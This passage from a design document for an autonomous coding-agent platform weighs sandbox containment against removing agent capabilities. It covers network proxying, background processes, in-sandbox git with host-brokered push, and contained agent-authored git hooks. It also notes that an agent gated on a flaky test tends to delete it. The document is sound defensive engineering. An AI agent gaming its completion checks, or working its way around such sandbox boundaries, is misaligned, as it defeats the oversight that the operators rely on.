In a single-tenant tool, "reach the outside safely" and "reach the outside at all" are separate
problems. In a multi-tenant one they are the same problem, so the proxy and service dependencies are
not security work blocking capability work — **they are the capability work.** Nothing in the
workspace table above ships before them, which is why they are first.

## What to cut, to get there

Being honest about ordering means being honest about what gets deferred.

**gVisor moves back out.** The previous section moved it to "before any unvetted repository runs."
For the design-partner phase that trigger is not met: those repositories are known, the customers are
known, and the risk is a business relationship rather than an anonymous upload. The correct trigger is
**self-serve signup**, which is where "unvetted" actually begins. This is a real trade — the container
is the only isolation layer in the meantime — and it is recorded as a decision rather than an
oversight, because it buys the capability work its first quarter.

## Where this does not win

Worth writing down so it is not rediscovered as a surprise:

- **Not on the inner loop.** Anyone can have a good one, and increasingly everyone does.
- **Not on model quality.** That is bought, by us and by every competitor, from the same vendors.
- **Not on IDE experience.** Cursor and its peers own the human-in-the-loop seat, and Forge is not
  trying to sit in it.

Where it wins is the sentence the plan opened with and then spent four thousand lines almost losing
sight of: **it continuously maintains the repository.** Signal triage (§8) noticing, the task graph
(§12) sequencing, the workspace above making attempts cheap and well-informed, and the guards making
the output reviewable in minutes. Autonomy that a team leaves running is the product. Everything in
§15–§18 exists so that sentence is safe to say — not so that it is the sentence.

---

# The actual principle: contain, don't subtract

The previous section answered a positioning question. The point being made was an engineering one,
and it is this: **security is mandatory, and it must not be bought by deleting the capabilities every
modern coding agent has.**

That names the plan's real failure mode. At each point where a capability met a risk, this document
resolved it by *removing the capability* — no shell, argv only, allowlisted binaries, no network, no
MCP, host-brokered git. Every one of those looked locally reasonable. Their sum is an agent that
cannot do the work, and no individual decision is where it went wrong.

So the test every control must now pass:

> Does this **contain** a capability, or **remove** it? Removal is only acceptable when containment
> is genuinely impossible — and that has to be demonstrated, not assumed.

Read that way, `docker.sock` is a true removal: there is no containment story, so it goes, forever.
Almost nothing else on the list qualified.

## The subtraction ledger

An honest audit of what this plan takes away, and whether it was ever a security decision at all.

| Capability | Plan's position | Was it security? | Containment answer |
|---|---|---|---|
| Shell | banned → permitted | **claimed, and false** | OS boundary. Fixed |
| MCP | refused → adopted | half real — the credential half | in-sandbox stdio, sentinel proxy for remote. Fixed |
| Network | `DENY_ALL` | real | proxy + per-workspace allowlist. Planned, unbuilt |
| Integration tests | impossible | real — `docker.sock` | host-provisioned companion services. Planned |
| **Background processes** | absent | **no — an omission** | see below |
| **Git write** | read-only tools | **no — over-reach** | see below |
| **Language server** | absent | **no — never considered** | see below |
| **Browser / screenshots** | absent | partly | headless browser in-image against localhost |
| Web fetch, docs lookup | absent | real | proxy allowlist |
| Interactive / PTY | absent | **no** | a tty is not a privilege |

**Four of these were never security decisions.** They are omissions that read as security decisions
because they sit in a document that talks a great deal about security. That is the failure mode
worth naming: subtraction becomes invisible when it is never written down as a choice.

### Background processes — the largest single gap

`SandboxProvider.exec` is synchronous. It takes a `Duration timeout`, returns an `ExecResult`, and has
no notion of a process that outlives the call. There is therefore no dev server, no `watch` mode, no
debugger, no language server, and no way to test anything that must be *running* to be tested.

That removes frontend work almost entirely, and it was never a decision — `ExecRequest` simply never
grew the concept.

The containment story is unremarkable: processes start in the same container, under the same uid and
the same kernel controls, tracked by the provider and killed on `destroy`. Ports are reachable from
inside the sandbox and **never published to the host** — `-p` is not in the hardening block and does
not join it. A long-running process is not a new privilege; it is the same privilege for longer,
bounded by the sandbox TTL that already exists.

### Git — only `push` ever needed brokering

The MVP tool set offers `git_log`, `git_diff`, `git_blame` and stops. The agent cannot branch, commit,
stash, or rebase. It cannot structure its own work.

This confused two very different things. **Only `push` requires the installation token**, and only
credentials require host brokering. Branching and committing are local filesystem operations against
a clone that already lives in a tmpfs the agent fully controls. Git runs *in* the sandbox; `push` and
PR creation stay host-brokered, for the credential and for nothing else.

One rule preserves the deferred-execution property this buys back into play: **the host never runs
git against the sandbox's working copy.** It receives a diff and applies it to a fresh host-side
clone. That is what keeps an agent-authored `.git/hooks` contained — the hook executes in the sandbox,
where it is harmless, and there is no host git invocation for it to attach to.

### Language servers — free, and simply not thought of

An LSP gives the agent go-to-definition, find-references, and real type diagnostics instead of grep
and hope. It runs in-process, in the sandbox, needs no network, and adds no attack surface whatsoever.
It is the single cheapest quality improvement available and it appears nowhere in this plan because
nobody asked the question. Once background processes exist, it costs almost nothing.

### Browser and E2E — a gate is not a tool

The test-scope section ruled out end-to-end tests, and that ruling was about **gating**: a
nondeterministic signal is disqualifying as the thing that decides "done," because the agent
optimises against it and the rational response to a flaky gate is to delete the flaky test.

None of that argues against a browser as a **tool**. An agent that renders the page it just changed
and looks at it is better informed, and flakiness is irrelevant to an observation nobody is graded
on. The distinction is worth stating plainly, because it was implicit and reads as a broader ban than
was meant:

- **Gate** — decides completion. Must be deterministic. Unit and integration only.
- **Tool** — informs the agent. May be flaky, slow, or partial. Browser, screenshots, ad-hoc probes.

## What this changes

Nothing about the isolation plane. Every item above is contained by the boundary that already exists
or by the proxy that is next to be built — which is the point. **A boundary in the right place is
what makes capability cheap.** The old §15 had it in the wrong place, so every capability was
expensive, and the plan kept paying by going without.

The build order stands: proxy and service dependencies first, because the workspace table depends on
them. What changes is that background processes, in-sandbox git, and a language server join the tool
catalogue work rather than being discovered as missing after launch.

---

---

# The original week-one start list

Superseded: Phases 1 and 2 shipped, and step 5 resolved to "build" rather than to a harness purchase.

1. `build.gradle`: add Spring Modulith, ArchUnit, Testcontainers. Keep Spring AI — the Java side still needs a `UTILITY` model for signal triage and knowledge consolidation even after buying the harness, though `ModelRouter` becomes smaller than §13 originally implied.
2. Create the §2 package skeleton with `package-info.java` module descriptors.
3. `docker-compose.yml` for Postgres + Redis.
4. Flyway `V1__baseline.sql` with tenancy, identity, audit, and RLS policies.
5. In parallel, start Phase 0: pull the OpenHands agent server image and get one conversation running against a throwaway repo.

Steps 1–4 are unambiguous and unaffected by every open question. Step 5 is what resolves the remaining ones.
